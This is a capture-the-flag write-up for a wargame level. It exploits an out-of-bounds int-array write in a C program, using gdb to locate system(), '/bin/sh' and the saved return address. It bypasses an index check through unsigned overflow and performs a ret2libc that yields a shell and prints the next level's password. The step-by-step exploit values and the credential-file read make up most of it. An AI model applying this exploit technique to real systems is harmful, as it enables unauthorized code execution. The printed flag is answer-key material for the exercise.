The program starts by clearing the environment and arguments before entering a loop that allows the use of 3 commands: store, read, and quit:

```c
while (true)
    {
        printf("Input command: ");
        int result = 1;
        char input[20] = {0};
        fgets(&input, 20, stdin);
        input[strcspn(&input, "\n")] = 0;

        if (!strncmp(&input, "store", 5))
            result = store_number(&buffer);
        if (!strncmp(&input, "read", 4))
            result = read_number(&buffer);
        if (!strncmp(&input, "quit", 4))
            return 0;
        if (result == 0)
            printf(" Completed %s command successfully…", input);
        else
            printf(" Failed to do %s command\n", input);
        memset(input, 0, 20);
    }
```

It quickly becomes apparent that it is possible to read and store values at locations far beyond the  `int buffer[100]` 
declared in the main at any value, with the exception of `store_number()` which protects multiples of 3:

```C
int store_number(int buffer)
{
  int number;
  int index;
  int ret;
  
  printf(" Number: ");
  number = get_unum();
  printf(" Index: ");
  index = get_unum();
  if ((index % 3 == 0) || (number >> 24 == 183)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    ret = 1;
  }
  else {
    // assign the value of number at the index of the buffer
    *(unsigned int *)(index * 4 + buffer) = number;
    ret = 0;
  }
  return ret;
}

int read_number(int arg1)
{
    int var_10 = 0;
    printf(" Index: ");
    int nb = get_unum();
    printf(" Number at data[%u] is %u\n", nb, *((nb << 2) + arg1));
    return 0;
}
```

Okay, `store_number()` allows writing just about anywhere in memory at an unsigned int32 memory space, 
so 4 bytes, enough space for an address, for example.

We can find the precise index of EIP relative to the buffer's address to see if it's possible to reach it with a specific index, and attempt a ret2libc.

The buffer appears to be at `esp+0x24`, starting precisely at `0xffffd4a4`:
```nasm
   0x08048924 <+513>:	lea    0x24(%esp),%eax
   0x08048928 <+517>:	mov    %eax,(%esp)
   0x0804892b <+520>:	call   0x80486d7 <read_number>

...

(gdb) x/10d $esp+0x24
0xffffd4a4:	0	42	42	0
0xffffd4b4:	42	42	0	0
0xffffd4c4:	0	0
```

Let's also get the address of `system()`:
```nasm
Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

And get the address of a buffer containing "/bin/sh" as in level05:
```nasm
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
We have a buffer located at `0xf7f897ec`.

Now, we need to find the main EIP index, which must be somewhere after the `int buffer[100]`.
```nasm
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) i f
Stack level 0, frame at 0xffffd670:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd668, args: 
 Locals at 0xffffd668, Previous frame's sp is 0xffffd670
 Saved registers:
  ebp at 0xffffd668, eip at 0xffffd66c
```

EIP is located at `0xffffd66c` and contains the address `0xf7e45513`.

To find the distance between the two, we can do:

- EIP address - buffer[0] address = distance
- That is 0xffffd66c - 0xffffd4a4 = 0x1C8
- Or 4294956652 - 4294956196 = **456**

So, there's a gap of 456 bytes between them. Given it's an int array, each index number jumps 4 bytes. 
To find the precise index, just do the inverse operation, which is **456 / 4 = 114**.

But index 114 is protected:
```bash
Input command: store
 Number: 42
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

Let's still verify if there's no error with the index 114:
```nasm
Input command: store
 Number: 42
 Index: 113
 Completed store command successfully
Input command: store
 Number: 42
 Index: 115
 Completed store command successfully
Input command: quit

Breakpoint 1, 0x080489ea in main ()
(gdb) x/50d 0xffffd65c 
0xffffd65c:	-134418444	0	0	42
0xffffd66c:	-136030957	42	-10492	-10484

...

(gdb) x/50x 0xffffd65c 
0xffffd65c:	0xf7fceff4	0x00000000	0x00000000	0x0000002a ; 2a = 42
0xffffd66c:	0xf7e45513	0x0000002a	0xffffd704	0xffffd70c
0xffffd67c:	0xf7fd3000	0x00000000	0xffffd71c	0xffffd70c
```

Indeed, it is the precise location of EIP, the values 42 (0x0000002a) of index 113 and 115 
surround the value `0xf7e45513` which is the address contained in EIP.

Now we need to find a way to bypass the following protection:
```C
if ((index % 3 == 0) || (number >> 24 == 183)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    ret = 1;
  }
```

The address at which the number variable is assigned is cast to uint:
```C
else {
    // assign the value of number at the index of the buffer
    *(uint *)(index * 4 + buffer) = number;
    ret = 0;
  }
```

As the index value is multiplied by 4, we can attempt a uint overflow to write 
index 114 without the index % 3 value being equal to 0.

For reference, the UINT32 max is 4294967295 or 0xffffffff. Using this site, 
we can easily compare values and their overflow: https://www.simonv.fr/TypesConvert/?integers

To start overflowing, we therefore need to do 4294967295(UINT32 MAX) + 458(the distance) = **4294967753**

And divide it all by 4 to have a value that can be indexed like uint pointer, which gives 4294967753 / 4 = **1073741938**

Since 1073741938 % 3 = 1, we will be able to write this value without being blocked by the protection if it's work.

Let's test if we've managed to rewrite EIP:
```bash
Input command: store
 Number: 42
 Index: 1073741938
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0x0000002a in ?? ()
```

Perfect it works! 🙂

Now, we simply need to add the decimal value of `system()` instead of the address contained in EIP, 
and write 4 bytes further the address of the buffer containing "/bin/sh" to add it as a parameter of `system()`.

- System address: 0xf7e6aed0 = `4159090384` to enter at index `1073741938` to replace EIP's main address
- Don't write a clean `exit()` return address after EIP because we're rebelz like Sanic the hedgahag
- Address of /bin/sh: 0xf7f897ec = `4160264172` to enter by skipping 4 bytes at index 116 because 116 is not protected

```C
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```

Aaand we get the flag !
```bash
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
